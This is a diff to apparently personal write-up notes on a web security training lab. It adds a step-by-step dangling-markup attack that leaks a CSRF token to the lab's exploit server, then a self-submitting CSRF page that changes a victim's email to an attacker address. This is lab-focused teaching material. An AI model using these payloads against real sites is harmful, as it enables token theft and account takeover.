@@ -995,23 +995,69 @@ fetch('/my-account/change-email'       --> Creating a new data and changing the 
 
 <img width="835" height="429" alt="image" src="https://github.com/user-attachments/assets/9d3d0a78-5715-4f27-a68d-2ff3771f6089" />
 
-- We will try to send the query string to the url and inspect the value in the DOM. We can also see the csrf token below out value. 
+- We will try to send the query string to the url and inspect the value in the DOM. We can also see the csrf token below as hidden. 
 
 <img width="1062" height="564" alt="image" src="https://github.com/user-attachments/assets/89a1600f-61d6-45db-b025-e9c6002f2de1" />
 
-- We will try to inject a href with title click me near the button and see in the DOM.  
+- We will try to inject a href with title click me near the button and see in the DOM.
 
-<img width="1093" height="254" alt="image" src="https://github.com/user-attachments/assets/e9f62a2b-adef-4885-a7e1-135c0a0b832a" />
+- Lets Try to reveal the csrf token by itself by changing the hidden to text.
 
-<img width="782" height="174" alt="image" src="https://github.com/user-attachments/assets/6e0f86e9-b7cb-4b72-a305-ddc99bf0a804" />
+<img width="1097" height="560" alt="image" src="https://github.com/user-attachments/assets/1d7a6b70-bec7-4b4a-90db-f6d6590bf07a" />
 
-- We can see it is injected perfectly and we don't need a extra ">.  Here we are use the dangling markup by using the base attribute. 
+- But when we try to update the email it will automatically hide the csrf value.
 
-<img width="1203" height="618" alt="image" src="https://github.com/user-attachments/assets/16f19e38-76f6-4578-bfba-76c0849f7a81" />
+<img width="930" height="470" alt="image" src="https://github.com/user-attachments/assets/089d519b-6005-4470-baa9-d3661d05fddb" />
 
-- 
+- We have tried to close the previous form and open a new form which has the following payload which creates a new button called Click in the UI and when clicking that we will move to the exploit server.
 
 - Dangling markup : Incomplete markup that might retrives the our desired value. Like this <div>   <p>Hello.
+
+"></form><form class="login_form" name="myform" action="https://exploit-0a5200cd0405e0a5817bb5d601560070.exploit-server.net/" method=GET><button class="button" type="Submit">Click</button   
+
+<img width="1171" height="636" alt="image" src="https://github.com/user-attachments/assets/894f7879-8c41-4f08-b047-50d739c28d88" />
+
+- We can see the previously opened form is closed and within our new form we got the csrf token. 
+
+<img width="1001" height="496" alt="image" src="https://github.com/user-attachments/assets/c0ea6876-004d-4592-8df4-41c8626a08f0" />
+
+- When clicking that we redirect to the exploit server and in the url csrf value is revealed.
+
+<img width="1299" height="516" alt="image" src="https://github.com/user-attachments/assets/9739284c-b406-4915-8134-f924bf1ce0ef" />
+
+- Let's try to inject the script in the exploit server and we can see the log value there is new csrf in the log. 
+
+<img width="1274" height="601" alt="image" src="https://github.com/user-attachments/assets/b206b466-3004-4cfe-9b04-5f9c531fcbd2" />
+
+- Even though we got a csrf value we can't able to change the email address it is showing as 400 bad request that is because the session id is not matching with the csrf token. 
+
+<img width="1029" height="566" alt="image" src="https://github.com/user-attachments/assets/6d7243ea-6b8d-4369-b3d2-86755267d890" />
+
+- Hence we will create a pay load to inject the csrf token to the already login user and try to change thier email. 
+
+- Hence by posting this payload we can solve the lab. 
+<html>
+<body>
+<form action="https://0a98003e034ea94d8158894b0042006f.web-security-academy.net/my-account/change-email" method="POST">
+<input type="hidden" name="email" value="hacker12@evil-user.net" />
+<input type="hidden" name ="csrf" value="HwPR53BGjteJ4Wg65ey6BOMJpykKfILY" />
+<input type="submit" value="submit" /> 
+</form>
+<script>
+history.pushState(' ' , ' ' , '/' );
+document.forms[0].submit();
+</script>
+</body>
+</html>
+
+Document.form[0] ---> submit the form first
+history.pushState ---> delete the push state. 
+
+<img width="1197" height="635" alt="image" src="https://github.com/user-attachments/assets/6f04ae00-8bc5-4a10-8d63-87494bb4e606" />
+
+Hence by posting this we can solve the lab. 
+
+<img width="1224" height="453" alt="image" src="https://github.com/user-attachments/assets/0bfba356-ad16-4cad-ae5c-efa39e32dc90" />
 
 
 # 30. Reflected XSS protected by CSP, with CSP bypass
